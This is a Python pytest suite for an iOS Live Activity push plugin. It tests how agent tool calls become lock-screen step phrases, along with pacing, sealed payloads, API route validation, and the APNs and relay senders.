"""Lock Screen steps (0.9.22): the app's step words (live_steps.py), the /live routes, pacing, the sealed card and the
end. ``~/.hermes/hermes-agent/venv/bin/python -m pytest -q test_live_steps.py`` from the plugin folder."""
import base64
import importlib.util
import json
import sqlite3
import sys
import types
from pathlib import Path

import pytest

HERE = Path(__file__).parent

if "hermes_hq_push_core" in sys.modules:
    push = sys.modules["hermes_hq_push_core"]
else:
    _spec = importlib.util.spec_from_file_location("hermes_hq_push_core", HERE / "push.py")
    push = importlib.util.module_from_spec(_spec)
    sys.modules["hermes_hq_push_core"] = push
    _spec.loader.exec_module(push)
steps = push.live_steps

needs_crypto = pytest.mark.skipif(importlib.util.find_spec("cryptography") is None, reason="cryptography not installed")

PHONE = "4F1A2B3C-0000-4000-8000-000000000001"
ACTIVITY = "9E5C1D2A-1111-4222-8333-444455556666"
TOKEN = "ab" * 32
LIVE_TOKEN = "cd" * 80
KEY = bytes(range(32))
SEAL = base64.b64encode(KEY).decode()
STARTED = 815_000_000.25  # seconds since 2001-01-01, as Swift's Date encodes


# ---------------------------------------------------------------------------
# The words: the same outputs as the app's ToolNowTests and LiveStepsTests
# ---------------------------------------------------------------------------

PHRASES = [
    ("terminal", {"command": "cd /Users/x/app && npm test"}, "running npm test"),
    ("terminal", {"command": "PYTHONPATH=. /usr/bin/python3 /a/b/run_checks.py --fast\nmore"}, "running python3 run_checks.py --fast"),
    ("read_file", {"path": "/Users/x/app/package.json"}, "reading package.json"),
    ("web_search", {"query": "swift actors"}, "searching the web for swift actors"),
    ("browser_navigate", {"url": "https://www.apple.com/iphone/compare/"}, "opening apple.com"),
    ("image_generate", {"prompt": "a red fox"}, "making an image"),
    ("mcp__linear__search_issues", {}, "using linear search issues"),
    ("mcp__composio__COMPOSIO_SEARCH_TOOLS", {"queries": []}, "looking for the right tool"),
    ("mcp__composio__COMPOSIO_SEARCH_TOOLS", {"queries": [{"use_case": "Send email"}]}, "looking for a tool to send email"),
    ("mcp__composio__COMPOSIO_MULTI_EXECUTE_TOOL", {"tools": [{"tool_slug": "SALESFORCE_RUN_SOQL_QUERY"}]},
     "running SOQL query in Salesforce"),
    ("mcp__composio__COMPOSIO_MULTI_EXECUTE_TOOL", {"tools": [{"tool_slug": "NOTION_SEARCH_NOTION_PAGE"}]}, "searching page in Notion"),
    ("mcp__composio__COMPOSIO_MULTI_EXECUTE_TOOL", {"tools": [{"tool_slug": "GMAIL_FETCH_EMAILS"}, {"tool_slug": "GMAIL_LIST_LABELS"}]},
     "running 2 actions in Gmail"),
    ("mcp__composio__COMPOSIO_MULTI_EXECUTE_TOOL",
     {"tools": [{"tool_slug": "GOOGLECALENDAR_FIND_EVENT"}, {"tool_slug": "SLACK_SEND_MESSAGE"}]}, "running 2 actions in Google Calenda…"),
    ("mcp__composio__COMPOSIO_MANAGE_CONNECTIONS", {"toolkits": ["googledrive"]}, "checking the Google Drive connection"),
    ("mcp__composio__COMPOSIO_GET_TOOL_SCHEMAS", {"tool_slugs": ["GOOGLEDRIVE_DOWNLOAD_FILE"]}, "reading how to use download file in…"),
    ("mcp__composio__COMPOSIO_REMOTE_WORKBENCH",
     {"code_to_execute": "r,err=run_composio_tool('GOOGLEDRIVE_DOWNLOAD_FILE',{'fileId':1})"}, "running a script that does download…"),
    ("mcp__composio__COMPOSIO_REMOTE_WORKBENCH", {"code_to_execute": "print(1)"}, "running a script"),
    ("tool_call", {"calls": [{"name": "mcp__composio__COMPOSIO_MULTI_EXECUTE_TOOL",
                              "arguments": {"tools": [{"tool_slug": "GOOGLEDRIVE_FIND_FILE"}]}}]}, "finding file in Google Drive"),
    ("mcp_github_GET_ISSUE", {}, "using github get issue"),
    ("web_search", {"query": "how do I make a swiftui list scroll to the bottom on appear"},
     "searching the web for how do I make a swiftui list scroll…"),
    # LiveStepsTests
    ("read_file", {"path": "/a/notes.md"}, "reading notes.md"),
    ("terminal", {"command": "git status"}, "running git status"),
    ("read_file", {"path": "/x/a.swift"}, "reading a.swift"),
    ("message_agent", {"target": "@cro", "message": "hi"}, "messaging cro"),  # no roster here: the handle
    # The rest of ToolNow.phrase's branches, read off the Swift.
    ("message_agent", {"message": "hi"}, "messaging another bot"),
    ("delegate_task", {"tasks": [{"goal": "a"}, {"goal": "b"}]}, "handing off 2 tasks"),
    ("delegate_task", {"goal": "write the docs"}, "handing off a task"),
    ("tool_call", {"calls": [{"name": "read_file"}, {"name": "terminal"}]}, "running 2 tools"),
    ("tool_call", {"calls": [{"name": "read_file", "arguments": "{\"path\": \"/a/b/c.txt\"}"}]}, "reading c.txt"),
    ("terminal", {}, "running a command"),
    ("terminal", {"command": "sudo env FOO=1 /usr/local/bin/brew upgrade"}, "running sudo brew upgrade"),
    ("web_extract", {"urls": ["https://www.example.com/a/b"]}, "reading example.com"),
    ("web_extract", {}, "reading a page"),
    ("browser_navigate", {}, "opening a page"),
    ("search_files", {"pattern": "TODO"}, "searching files for TODO"),
    ("skill_view", {"name": "deploy"}, "reading skill deploy"),
    ("memory", {"action": "add"}, "updating memory"),
    ("session_search", {"query": "x"}, "searching past chats"),
    ("write_file", {"path": "C:\\work\\notes.txt"}, "writing notes.txt"),
    ("functions.read_file", {"path": "/a/README.md"}, "reading README.md"),
    ("browser_type", {"text": 42}, "typing 42"),
    ("some_new_tool", {}, "using some new tool"),
    ("mcp__composio__COMPOSIO_WAIT_FOR_CONNECTION", {"toolkits": ["gmail", "slack"]}, "waiting for app connections"),
    ("mcp__composio__COMPOSIO_MULTI_EXECUTE_TOOL", {}, "using a connected app"),
]


@pytest.mark.parametrize("name,args,words", PHRASES)
def test_phrases_match_the_app(name, args, words):
    assert steps.phrase(name, args) == words


def test_phrase_details():
    assert "composio" not in steps.phrase("mcp__composio__COMPOSIO_SOMETHING_NEW", {}).lower()
    assert len(steps.short("a" * 40)) == steps.SUBJECT_LIMIT
    assert steps.phrase("terminal", "not a dict") == "running a command"
    assert steps.gerund("make") == "making" and steps.gerund("run") == "running" and steps.gerund("see") == "seeing"
    assert steps.action_words("GMAIL_GMAIL", True) == "using it"
    assert steps.command("cd /x && cd y") == "cd x && cd y"  # all cds: the line as it is


def test_silent_tools_are_the_apps():
    for name in ("todo", "todo_list", "react_to_message"):
        assert steps.is_silent(name)
    assert not steps.is_silent("terminal") and not steps.is_silent(None)


# ---------------------------------------------------------------------------
# The trail and its pace
# ---------------------------------------------------------------------------

def test_trail_follows_like_the_app():
    trail = steps.Trail()
    assert trail.follow("reading package.json")
    assert not trail.follow("reading package.json")  # the same words: nothing new
    assert trail.follow("running npm test") and trail.follow("searching the web")
    assert trail.follow("opening apple.com")
    assert trail.words() == {"step": "opening apple.com", "recent": ["searching the web", "running npm test"], "steps": 4}
    assert trail.settled().words() == {"step": None, "recent": ["opening apple.com", "searching the web"], "steps": 4}
    assert steps.Trail().settled().words() == {"step": None, "recent": [], "steps": 0}


def test_trail_from_the_app_is_made_safe():
    trail = steps.Trail.from_words({"step": "a\nb", "recent": ["x" * 80, " ", "y", "z"], "steps": True})
    assert trail.step == "a b"
    assert trail.recent == ["x" * 59 + "…", "y"]
    assert trail.steps == 0
    assert steps.Trail.from_words(None).words() == {"step": None, "recent": [], "steps": 0}


def test_pacer_sends_one_every_three_seconds_and_the_last_always():
    pacer = steps.Pacer()
    key = ("phone", "activity")
    assert pacer.offer(key, 100.0)
    assert pacer.sent(key, 100.0) == 5  # steps never spend iOS's priority-10 ration: the end needs it
    assert not pacer.offer(key, 101.0)
    assert not pacer.offer(key, 102.0)
    assert pacer.next_due() == 103.0
    assert pacer.take_due(102.9) == []
    assert pacer.take_due(103.0) == [key]
    assert pacer.sent(key, 103.0) == 5
    assert pacer.offer(key, 106.5)
    assert pacer.sent(key, 106.5) == 5
    assert pacer.offer(key, 121.0) and pacer.sent(key, 121.0) == 5
    pacer.offer(key, 122.0)
    pacer.forget(key)
    assert pacer.next_due() is None and pacer.offer(key, 122.5)


# ---------------------------------------------------------------------------
# The seal and the payload
# ---------------------------------------------------------------------------

@needs_crypto
def test_sealed_alerts_are_byte_for_byte_what_they_were():
    vectors = json.loads((HERE / "seal-vectors.json").read_text())
    key = base64.b64decode(vectors["key"])
    for case in vectors["cases"]:
        assert push.sealed(case["inner"], key, bytes(range(100, 112))) == case["outer"], case["name"]


@needs_crypto
def test_seal_box_round_trip():
    words = {"step": "running npm test", "recent": ["reading package.json"], "steps": 7}
    box = push.seal_box(words, KEY)
    assert box["v"] == 1 and box["kid"] == push.seal_kid(KEY) and len(box["kid"]) == 16
    assert push.unseal({"seal": box}, KEY) == words
    assert push.seal_box(words, KEY)["box"] != box["box"]  # a fresh nonce each time


def device(seal=SEAL, environment="production"):
    return push.Device(PHONE, TOKEN, environment, push.TOPIC, "*", {}, True, seal, "")


def row(session="s-chat", profile="cro", trail=None, registered=1000.0):
    return push.LiveRow(PHONE, ACTIVITY, LIVE_TOKEN, profile, session, STARTED, trail or steps.Trail(), registered)


@needs_crypto
def test_update_and_end_payloads():
    trail = steps.Trail("running npm test", ["reading package.json"], 2)
    now = 1_790_000_000.7
    update = push.live_payload(row(), trail, "update", now, device())
    aps = update["aps"]
    assert set(update) == {"aps"}
    assert aps["timestamp"] == 1_790_000_000 and aps["event"] == "update" and aps["stale-date"] == 1_790_000_000 + 1800
    state = aps["content-state"]
    assert set(state) == {"phase", "startedAt", "seal"} and state["phase"] == "working" and state["startedAt"] == STARTED
    assert push.unseal(state, KEY) == trail.words()
    assert "npm" not in json.dumps(update)
    end = push.live_payload(row(), trail.settled(), "end", now, device())["aps"]
    assert end["event"] == "end" and end["dismissal-date"] == 1_790_000_000 + 900 and "stale-date" not in end
    assert end["content-state"]["phase"] == "done"
    assert end["content-state"]["endedAt"] == pytest.approx(now - 978307200.0)
    assert push.unseal(end["content-state"], KEY) == {"step": None, "recent": ["running npm test", "reading package.json"], "steps": 2}


def test_a_quick_replys_done_goes_after_a_minute_a_longer_ones_after_fifteen():
    started_unix = STARTED + push.APPLE_EPOCH
    quick = push.live_payload(row(), steps.Trail(), "end", started_unix + 40.5, device(seal=""))["aps"]
    assert quick["dismissal-date"] == int(started_unix + 40.5) + 60
    longer = push.live_payload(row(), steps.Trail(), "end", started_unix + 61, device(seal=""))["aps"]
    assert longer["dismissal-date"] == int(started_unix + 61) + 900
    # A copy sent later says when the turn really ended, and keeps the same dismissal.
    copy = push.live_payload(row(), steps.Trail(), "end", started_unix + 70.5, device(seal=""), ended=started_unix + 40.5)["aps"]
    assert copy["dismissal-date"] == quick["dismissal-date"] and copy["timestamp"] == int(started_unix + 70.5)
    assert copy["content-state"]["endedAt"] == pytest.approx(STARTED + 40.5)
    # A start time that is somehow ahead of the end lingers the usual 15 minutes.
    assert push.live_linger(row(), started_unix - 5) == 900


@needs_crypto
def test_a_quick_replys_end_and_its_copy_both_go_a_minute_after_it_ended(feed):
    t = feed.test
    t.clock.now = STARTED + push.APPLE_EPOCH + 30
    t.store.put_live(row(registered=t.clock.now))
    assert feed.on_end("s-chat", "cro") == 1
    ended = t.clock.now
    assert t.sender.sent[-1][2]["aps"]["dismissal-date"] == int(ended) + 60 and t.sender.expires[-1] == int(ended) + 60
    t.clock.now += push.LIVE_END_AGAIN_S
    assert feed.flush() == 1
    again = t.sender.sent[-1][2]["aps"]
    assert t.sender.sent[-1][3] == 5 and again["dismissal-date"] == int(ended) + 60 and t.sender.expires[-1] == int(ended) + 60
    assert again["timestamp"] == int(t.clock.now), "a newer timestamp, so iOS takes it over the first"


def test_a_phone_without_a_key_reads_plain_words_when_sent_direct():
    trail = steps.Trail("running npm test", [], 1)
    state = push.live_payload(row(), trail, "update", 1000.0, device(seal=""))["aps"]["content-state"]
    assert state == {"phase": "working", "startedAt": STARTED, "step": "running npm test", "recent": [], "steps": 1}


# ---------------------------------------------------------------------------
# The store and the routes
# ---------------------------------------------------------------------------

def test_store_rows(tmp_path):
    store = push.Store(tmp_path / "devices.db")
    store.upsert(device())
    store.put_live(row())
    store.put_live(push.LiveRow(PHONE, "other-activity", "ef" * 40, "sam", "", STARTED, steps.Trail(), 1000.0))
    assert [r.activity_id for r in store.live_for("s-chat", "nobody")] == [ACTIVITY]
    assert sorted(r.activity_id for r in store.live_for("", "sam")) == ["other-activity"]
    assert store.live_row(PHONE, ACTIVITY).started_at == STARTED
    assert store.save_trail(PHONE, ACTIVITY, steps.Trail("x", [], 1))
    assert store.live_row(PHONE, ACTIVITY).trail.words() == {"step": "x", "recent": [], "steps": 1}
    # A new token for the same activity replaces it; the same token under another activity id moves.
    store.put_live(push.LiveRow(PHONE, "third", LIVE_TOKEN, "cro", "s-chat", STARTED, steps.Trail(), 1000.0))
    assert store.live_row(PHONE, ACTIVITY) is None and store.live_row(PHONE, "third") is not None
    assert store.prune_live(1000.0 + 8 * 3600 + 1, 8 * 3600) == 2
    store.put_live(row())
    assert store.remove(PHONE) and store.live_count() == 0


@pytest.fixture
def client(tmp_path, monkeypatch):
    pytest.importorskip("fastapi")
    from fastapi import FastAPI
    from fastapi.testclient import TestClient
    monkeypatch.setenv("HERMES_HQ_PUSH_DATA_DIR", str(tmp_path / "data"))
    monkeypatch.setenv("HERMES_HQ_PUSH_RELAY_URL", "off")
    push._watcher_started = True  # no reply watcher in a test
    spec = importlib.util.spec_from_file_location("hermes_hq_push_api_live_under_test", HERE / "dashboard" / "plugin_api.py")
    api = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(api)
    app = FastAPI()
    app.include_router(api.router, prefix="/api/plugins/hermes-hq-push")
    return TestClient(app)


BASE = "/api/plugins/hermes-hq-push"


def live_body(**extra):
    return {"token": LIVE_TOKEN.upper(), "profile": "cro", "session": "20260928_102900_3af825", "startedAt": STARTED,
            "trail": {"step": "reading package.json", "recent": [], "steps": 1}, **extra}


def test_routes(client, tmp_path, monkeypatch):
    status = client.get(f"{BASE}/status").json()
    assert status["liveSteps"] is True and status["liveEnds"] is True and status["liveQuick"] is True
    assert status["pluginVersion"] == "0.9.42"
    # Not registered for notifications yet.
    missing = client.put(f"{BASE}/live/{PHONE}/{ACTIVITY}", json=live_body())
    assert missing.status_code == 404 and "detail" in missing.json()
    phone = {"token": TOKEN, "environment": "sandbox", "topic": push.TOPIC}
    assert client.put(f"{BASE}/devices/{PHONE}", json=phone).status_code == 200
    assert client.put(f"{BASE}/live/{PHONE}/{ACTIVITY}", json=live_body()).json() == {"ok": True}
    store = push.Store(tmp_path / "data" / "devices.db")
    saved = store.live_row(PHONE, ACTIVITY)
    assert saved.token == LIVE_TOKEN and saved.session == "20260928_102900_3af825" and saved.started_at == STARTED
    assert saved.trail.words() == {"step": "reading package.json", "recent": [], "steps": 1}
    # Optional trail and session; the same activity again replaces it.
    assert client.put(f"{BASE}/live/{PHONE}/{ACTIVITY}", json={"token": LIVE_TOKEN, "profile": "cro", "startedAt": 1}).status_code == 200
    assert store.live_row(PHONE, ACTIVITY).session == "" and store.live_count() == 1
    for bad_path, body in [(f"{PHONE}/has_underscore", live_body()), (f"{PHONE}/{'a' * 65}", live_body()),
                           (f"short/{ACTIVITY}", live_body()), (f"{PHONE}/{ACTIVITY}", live_body(token="xyz")),
                           (f"{PHONE}/{ACTIVITY}", live_body(profile="../x")), (f"{PHONE}/{ACTIVITY}", live_body(session="a b")),
                           (f"{PHONE}/{ACTIVITY}", live_body(startedAt="soon")), (f"{PHONE}/{ACTIVITY}", live_body(trail={"steps": -1}))]:
        assert client.put(f"{BASE}/live/{bad_path}", json=body).status_code in (400, 422), bad_path
    # Withdrawn: 200, also when unknown.
    assert client.delete(f"{BASE}/live/{PHONE}/{ACTIVITY}").json() == {"ok": True, "removed": True}
    assert client.delete(f"{BASE}/live/{PHONE}/{ACTIVITY}").json() == {"ok": True, "removed": False}
    assert client.delete(f"{BASE}/live/{PHONE}/bad_id").status_code == 400
    # Unregistering the phone takes its cards with it.
    client.put(f"{BASE}/live/{PHONE}/{ACTIVITY}", json=live_body())
    assert client.delete(f"{BASE}/devices/{PHONE}").status_code == 200
    assert store.live_count() == 0


@needs_crypto
def test_relay_mode_needs_a_seal_key(client, tmp_path, monkeypatch):
    phone = {"token": TOKEN, "environment": "sandbox", "topic": push.TOPIC}
    client.put(f"{BASE}/devices/{PHONE}", json=phone)  # registered while delivery was off: no key
    monkeypatch.setenv("HERMES_HQ_PUSH_RELAY_URL", "https://relay.example")
    refused = client.put(f"{BASE}/live/{PHONE}/{ACTIVITY}", json=live_body())
    assert refused.status_code == 409
    assert client.put(f"{BASE}/devices/{PHONE}", json={**phone, "seal": SEAL}).status_code == 200
    assert client.put(f"{BASE}/live/{PHONE}/{ACTIVITY}", json=live_body()).status_code == 200


# ---------------------------------------------------------------------------
# The feed: steps in, pushes out
# ---------------------------------------------------------------------------

class Clock:
    def __init__(self, now=1_790_000_000.0):
        self.now = now

    def __call__(self):
        return self.now


class Sender:
    def __init__(self):
        self.sent, self.fail, self.expires = [], None, []

    def send_live(self, device, token, payload, priority, expires=None):
        if self.fail:
            error, self.fail = self.fail, None
            raise error
        self.sent.append((device.device_id, token, payload, priority))
        self.expires.append(expires)


def state_db(path, rows):
    path.parent.mkdir(parents=True, exist_ok=True)
    with sqlite3.connect(path) as db:
        db.execute("create table sessions (id text primary key, source text, parent_session_id text, end_reason text,"
                   " model_config text)")
        db.execute("create table messages (id integer primary key, session_id text, role text, content text,"
                   " finish_reason text)")
        db.executemany("insert into sessions (id, source, parent_session_id, end_reason) values (?,?,?,?)", rows)


@pytest.fixture
def feed(tmp_path):
    store = push.Store(tmp_path / "devices.db")
    store.upsert(device())
    sender, clock = Sender(), Clock()
    live = push.LiveFeed(lambda: store, sender_factory=lambda: sender, clock=clock,
                         lineage=push.Lineage(lambda: tmp_path / "hermes"))
    live.test = types.SimpleNamespace(store=store, sender=sender, clock=clock)
    return live


def opened(sent):
    return push.unseal(sent[2]["aps"]["content-state"], KEY)


@needs_crypto
def test_each_step_updates_the_card_then_the_end(feed):
    t = feed.test
    t.store.put_live(row(trail=steps.Trail("reading package.json", [], 1), registered=t.clock.now))
    assert feed.on_step("terminal", {"command": "npm test"}, "s-chat", "cro") == 1
    device_id, token, payload, priority = t.sender.sent[0]
    assert (device_id, token, priority) == (PHONE, LIVE_TOKEN, 5)
    assert t.sender.expires[0] is None
    assert payload["aps"]["content-state"]["startedAt"] == STARTED
    assert opened(t.sender.sent[0]) == {"step": "running npm test", "recent": ["reading package.json"], "steps": 2}
    # Within 3 s: stored, not sent; the trailing push carries the newest trail.
    t.clock.now += 1
    assert feed.on_step("read_file", {"path": "/a/README.md"}, "s-chat", "cro") == 0
    feed.on_step("todo", {"todos": []}, "s-chat", "cro")  # silent: the step before stays
    t.clock.now += 1
    feed.on_step("web_search", {"query": "swift"}, "s-chat", "cro")
    assert feed.next_due() == pytest.approx(1_790_000_003.0)
    assert feed.flush() == 0
    t.clock.now += 1
    assert feed.flush() == 1
    assert t.sender.sent[-1][3] == 5
    assert opened(t.sender.sent[-1]) == {"step": "searching the web for swift", "recent": ["reading README.md", "running npm test"], "steps": 4}
    # The same words again change nothing; another chat's turn is not this card's.
    t.clock.now += 10
    assert feed.on_step("web_search", {"query": "swift"}, "s-chat", "cro") == 0
    assert feed.on_step("terminal", {"command": "ls"}, "s-other", "cro") == 0
    assert len(t.sender.sent) == 2
    # The end: Done, the last step a finished one, the row gone; a second end (the server heard it too) sends nothing.
    assert feed.on_end("s-chat", "cro") == 1
    _, _, end, priority = t.sender.sent[-1]
    assert priority == 10 and end["aps"]["event"] == "end" and end["aps"]["content-state"]["phase"] == "done"
    assert t.sender.expires[-1] == int(t.clock.now) + push.LIVE_DISMISS_S, "Apple holds the end for a phone out of reach"
    assert opened(t.sender.sent[-1])["step"] is None
    assert t.store.live_count() == 0
    assert feed.on_end("s-chat", "cro") == 0
    assert feed.on_step("terminal", {"command": "ls"}, "s-chat", "cro") == 0
    # The same end once more, at priority 5 (outside iOS's ration), in case the first was held back; then nothing.
    assert feed.next_due() == pytest.approx(t.clock.now + push.LIVE_END_AGAIN_S)
    t.clock.now += push.LIVE_END_AGAIN_S
    assert feed.flush() == 1
    _, _, again, priority = t.sender.sent[-1]
    assert priority == 5 and again["aps"]["event"] == "end" and again["aps"]["content-state"]["phase"] == "done"
    assert t.sender.expires[-1] == int(t.clock.now - push.LIVE_END_AGAIN_S) + push.LIVE_DISMISS_S, "counted from the end itself"
    assert feed.next_due() is None and feed.flush() == 0


@needs_crypto
def test_a_chat_compressed_mid_turn_keeps_its_card(feed, tmp_path):
    t = feed.test
    t.store.put_live(row(session="s-old", registered=t.clock.now))
    state_db(tmp_path / "hermes" / "profiles" / "cro" / "state.db",
             [("s-old", "desktop", None, "compression"), ("s-new", "desktop", "s-old", None),
              ("s-helper", "subagent", "s-new", None)])
    assert feed.on_step("terminal", {"command": "ls"}, "s-new", "cro") == 1
    assert feed.on_step("terminal", {"command": "pwd"}, "s-helper", "cro") == 0  # a helper's steps aren't the bot's
    assert feed.on_step("terminal", {"command": "ls"}, "s-new", "sam") == 0  # another bot
    assert feed.on_end("s-new", "cro") == 1


@needs_crypto
def test_a_card_without_a_chat_follows_its_bot_but_not_its_helpers(feed, tmp_path):
    t = feed.test
    t.store.put_live(row(session="", registered=t.clock.now))
    state_db(tmp_path / "hermes" / "profiles" / "cro" / "state.db",
             [("s-any", "desktop", None, None), ("s-helper", "subagent", "s-any", None)])
    assert feed.on_step("terminal", {"command": "pwd"}, "s-helper", "cro") == 0
    assert feed.on_step("terminal", {"command": "ls"}, "s-any", "cro") == 1
    assert feed.on_step("terminal", {"command": "ls"}, "s-any", "sam") == 0
    assert feed.on_end("s-helper", "cro") == 0
    assert feed.on_end("s-any", "cro") == 1


@needs_crypto
def test_dead_tokens_and_failures(feed):
    t = feed.test
    t.store.put_live(row(registered=t.clock.now))
    # Apple won't take this activity's token: the card's row goes, the phone stays registered.
    t.sender.fail = push.LiveGone("ExpiredToken")
    assert feed.on_step("terminal", {"command": "ls"}, "s-chat", "cro") == 0
    assert t.store.live_count() == 0 and t.store.get(PHONE) is not None
    # An update that fails for a moment is dropped; an end is tried once more.
    t.store.put_live(row(registered=t.clock.now))
    t.sender.fail = push.DeliveryError("503", "Relay 503", transient=True)
    assert feed.on_step("terminal", {"command": "pwd"}, "s-chat", "cro") == 0
    assert feed.retries == [] and t.store.live_count() == 1
    t.sender.fail = push.DeliveryError("503", "Relay 503", transient=True)
    assert feed.on_end("s-chat", "cro") == 0
    assert len(feed.retries) == 2  # the end tried again in 2 s, and its priority-5 copy in 30 s
    t.clock.now += 2
    assert feed.flush() == 1
    assert t.sender.sent[-1][2]["aps"]["event"] == "end" and t.sender.sent[-1][3] == 10 and len(feed.retries) == 1
    t.clock.now += push.LIVE_END_AGAIN_S
    assert feed.flush() == 1 and t.sender.sent[-1][3] == 5 and feed.retries == []
    # A card whose token Apple retired at the end gets no copy either.
    t.store.put_live(row(registered=t.clock.now))
    t.sender.fail = push.LiveGone("Unregistered")
    assert feed.on_end("s-chat", "cro") == 0
    assert feed.retries == [] and feed.next_due() is None
    health = push.Health(t.store.path)
    with sqlite3.connect(t.store.path) as db:
        names = {name for (name,) in db.execute("select name from delivery")}
    assert {"live:gone", "live:failed:503", "live:retried:503", "live:end", "live:end-again"} <= names
    assert health.summary()["sent"] == 0  # alerts' own counts aren't touched


@needs_crypto
def test_old_rows_go_and_an_idle_store_isnt_read(feed):
    t = feed.test
    t.store.put_live(row(registered=t.clock.now - 8 * 3600 - 5))
    assert feed.on_step("terminal", {"command": "ls"}, "s-chat", "cro") == 0
    assert t.store.live_count() == 0
    reads = []
    real = t.store.live_for
    t.store.live_for = lambda *a: reads.append(a) or real(*a)
    feed.on_step("terminal", {"command": "ls"}, "s-chat", "cro")
    feed.on_step("terminal", {"command": "pwd"}, "s-chat", "cro")
    assert len(reads) <= 1
    t.store.put_live(row(registered=t.clock.now))  # a new card: read again
    assert feed.on_step("terminal", {"command": "whoami"}, "s-chat", "cro") == 1


def test_relay_mode_drops_a_card_it_cant_seal(tmp_path):
    store = push.Store(tmp_path / "devices.db")
    store.upsert(device(seal=""))
    store.put_live(row(registered=1_790_000_000.0))

    class Quiet(push.Relay):
        def send_live(self, *a):
            raise AssertionError("never sent")

    live = push.LiveFeed(lambda: store, sender_factory=lambda: Quiet("https://relay.example"), clock=Clock())
    assert live.on_step("terminal", {"command": "ls"}, "s-chat", "cro") == 0
    assert store.live_count() == 0


def test_hooks_only_queue(tmp_path):
    live = push.LiveFeed(lambda: push.Store(tmp_path / "devices.db"))
    live._put = lambda item: queued.append(item)
    queued = []
    args = {"command": "ls"}
    live.step("terminal", args, "s1", "cro")
    live.step("todo", {}, "s1", "cro")
    live.ended("s1", "")
    assert queued == [("step", "terminal", {"command": "ls"}, "s1", "cro"), ("end", "s1", "default")]
    assert queued[0][2] is not args


# ---------------------------------------------------------------------------
# The senders
# ---------------------------------------------------------------------------

class Curl:
    def __init__(self, stdout):
        self.stdout, self.calls = stdout, []

    def __call__(self, argv, **kwargs):
        header_file = next(a for a in argv if a.startswith("@") and a != "@-")[1:]
        self.calls.append({"url": argv[-1], "headers": Path(header_file).read_text().split("\n"), "body": kwargs["input"]})
        return types.SimpleNamespace(stdout=self.stdout, stderr="")


def direct(stdout):
    sender = push.DirectAPNs("/nope.p8", "KEY", "TEAM", runner=Curl(stdout))
    sender._bearer = lambda: "jwt"
    return sender


def test_direct_live_push_headers_and_answers():
    sender = direct("\n200")
    sender.send_live(device(environment="sandbox"), LIVE_TOKEN, {"aps": {"event": "update"}}, 5)
    call = sender.run.calls[0]
    assert call["url"] == f"https://api.sandbox.push.apple.com/3/device/{LIVE_TOKEN}"
    assert call["headers"] == ["authorization: bearer jwt", "apns-topic: com.charlesmcdowell.dispatch.push-type.liveactivity",
                               "apns-push-type: liveactivity", "apns-priority: 5"]
    assert json.loads(call["body"]) == {"aps": {"event": "update"}}
    sender.send_live(device(), LIVE_TOKEN, {"aps": {"event": "end"}}, 10, expires=1_790_000_900)
    assert sender.run.calls[1]["headers"][-2:] == ["apns-priority: 10", "apns-expiration: 1790000900"]
    for stdout in ('{"reason":"Unregistered"}\n410', '{"reason":"ExpiredToken"}\n400', '{"reason":"TopicDisallowed"}\n400'):
        with pytest.raises(push.LiveGone):
            direct(stdout).send_live(device(), LIVE_TOKEN, {}, 10)
    with pytest.raises(push.DeliveryError) as error:
        direct('{"reason":"InternalServerError"}\n500').send_live(device(), LIVE_TOKEN, {}, 10)
    assert error.value.transient and error.value.code == "500"


def test_direct_alerts_unchanged():
    sender = direct("\n200")
    sender.send(device(seal=""), push.Push("turnDone", session="s1", profile="cro", text="hi"))
    assert sender.run.calls[0]["headers"] == ["authorization: bearer jwt", "apns-topic: com.charlesmcdowell.dispatch",
                                              "apns-push-type: alert", "apns-priority: 10", "apns-collapse-id: turnDone:s1"]
    with pytest.raises(push.Gone):
        direct('{"reason":"BadDeviceToken"}\n400').send(device(seal=""), push.Push("turnDone", session="s1"))
    with pytest.raises(push.DeliveryError) as error:
        direct('{"reason":"ExpiredProviderToken"}\n403').send(device(seal=""), push.Push("turnDone", session="s1"))
    assert error.value.transient


class Reply:
    def __init__(self, status, body=None, headers=None):
        self.status_code, self._body, self.headers = status, body, headers or {}

    def json(self):
        if self._body is None:
            raise ValueError("no body")
        return self._body


def test_relay_live_push(monkeypatch):
    httpx = pytest.importorskip("httpx")
    posted = []
    answers = []
    monkeypatch.setattr(httpx, "post", lambda url, **kw: posted.append((url, kw)) or answers.pop(0))
    relay = push.Relay("https://relay.example", "k")
    answers.append(Reply(200, {"ok": True}))
    relay.send_live(device(), LIVE_TOKEN, {"aps": {"event": "end"}}, 10)
    url, kw = posted[0]
    assert url == "https://relay.example/v1/push" and kw["headers"]["authorization"] == "Bearer k"
    assert kw["json"] == {"token": LIVE_TOKEN, "environment": "production",
                          "topic": "com.charlesmcdowell.dispatch.push-type.liveactivity", "pushType": "liveactivity",
                          "priority": 10, "payload": {"aps": {"event": "end"}}}
    for reply in (Reply(410, {"error": "gone", "reason": "Unregistered"}), Reply(400, {"error": "x", "reason": "ExpiredToken"})):
        answers.append(reply)
        with pytest.raises(push.LiveGone):
            relay.send_live(device(), LIVE_TOKEN, {}, 5)
    answers.append(Reply(429, {"error": "busy"}, {"retry-after": "30"}))
    with pytest.raises(push.DeliveryError) as error:
        relay.send_live(device(), LIVE_TOKEN, {}, 5)
    assert error.value.transient and error.value.retry_after == 30
    answers.append(Reply(400, {"error": "Apple refused the push.", "reason": "BadCollapseId"}))
    with pytest.raises(push.DeliveryError) as error:
        relay.send_live(device(), LIVE_TOKEN, {}, 5)
    assert not error.value.transient
    # Alerts as before: a 410 is the phone's token gone.
    answers.append(Reply(410, {"error": "gone"}))
    with pytest.raises(push.Gone):
        relay.send(device(), push.Push("turnDone", session="s1"))
    assert posted[-1][1]["json"]["pushType"] == "alert" and "priority" not in posted[-1][1]["json"]


# ---------------------------------------------------------------------------
# Where the end comes from
# ---------------------------------------------------------------------------

def test_reply_watcher_ends_the_turn_of_every_finished_reply(tmp_path):
    root = tmp_path / "hermes"
    state_db(root / "profiles" / "cro" / "state.db", [("s1", "desktop", None, None), ("s2", "desktop", None, None)])
    ended, alerts = [], []
    watcher = push.ReplyWatcher(root, alerts.append, sender=lambda p: p, turn_ended=lambda p, s: ended.append((p, s)))
    watcher.poll()  # starts at the newest message
    with sqlite3.connect(root / "profiles" / "cro" / "state.db") as db:
        db.executemany("insert into messages (session_id, role, content, finish_reason) values (?,?,?,?)",
                       [("s1", "assistant", "working on it", "tool_calls"), ("s1", "assistant", "Done.", "stop"),
                        ("s2", "assistant", "[SILENT]", "stop")])
    watcher.poll()
    assert ended == [("cro", "s1"), ("cro", "s2")]  # a silent reply still ends its turn
